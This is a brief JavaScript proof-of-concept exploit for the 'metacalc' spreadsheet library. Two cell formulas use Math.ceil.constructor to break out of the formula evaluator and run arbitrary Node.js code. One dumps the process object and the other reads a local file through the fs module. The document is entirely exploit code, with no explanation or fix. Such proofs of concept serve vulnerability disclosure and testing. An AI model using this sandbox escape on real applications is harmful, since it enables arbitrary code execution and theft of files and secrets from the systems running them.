const { Sheet } = require('metacalc'); 
const sheet = new Sheet(); 
sheet.cells['A1'] = '=Math.ceil.constructor("console.log(process)")()'; 
console.log(sheet.values['A1']); 
sheet.cells['A3'] = '=Math.ceil.constructor("console.log(process.mainModule.require(\'fs\').readFileSync(\'./poc.js\', \'utf-8\'))")()'; 
console.log(sheet.values['A3']);
